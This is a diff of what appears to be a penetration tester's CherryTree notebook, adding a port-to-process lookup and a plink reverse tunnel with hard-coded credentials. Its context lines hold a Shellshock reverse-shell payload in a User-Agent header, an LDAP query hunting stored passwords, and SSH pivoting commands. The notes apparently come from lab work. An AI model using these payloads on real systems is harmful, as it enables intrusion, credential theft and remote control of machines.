@@ -676,7 +676,7 @@ $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Proper
       <rich_text family="monospace">certutil -encode raw.txt encoded.txt</rich_text>
     </node>
     <node name="findfile" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828241" ts_lastsave="1665828241"/>
-    <node name="postenum" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828653" ts_lastsave="1665828711">
+    <node name="postenum" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828653" ts_lastsave="1665829661">
       <rich_text>find open port all
 
 PS C:\users\shaun\Downloads&gt; netstat -ano
@@ -686,9 +686,14 @@ then check the process running using tasklist /v | findstr PID
 
   Proto  Local Address          Foreign Address        State           PID
   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       948
+
+or simply using
+Get-Process -Id (Get-NetTCPConnection -LocalPort 8888).OwningProcess
 </rich_text>
     </node>
-    <node name="plink_tunnel" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828699" ts_lastsave="1665828699"/>
+    <node name="plink_tunnel" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1665828699" ts_lastsave="1665829950">
+      <rich_text>C:\temp\plink.exe -l kali -pw kali 10.10.16.5 -R 3306:127.0.0.1:3306 -P 2222 &lt;&lt; working plink mysql forward using cmd.exe (nc.exe)</rich_text>
+    </node>
   </node>
   <node name="shell" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663587498" ts_lastsave="1663587499">
     <rich_text family="monospace">User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</rich_text>
@@ -1898,7 +1903,7 @@ exit</rich_text>
         </rich_text>
       </node>
     </node>
-    <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1664428369">
+    <node name="pivoting" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1656313484" ts_lastsave="1665842305">
       <rich_text>sudo ssh -N -L 0.0.0.0:80:192.168.1.105:80 wtf@10.1.2.114 
 
 </rich_text>
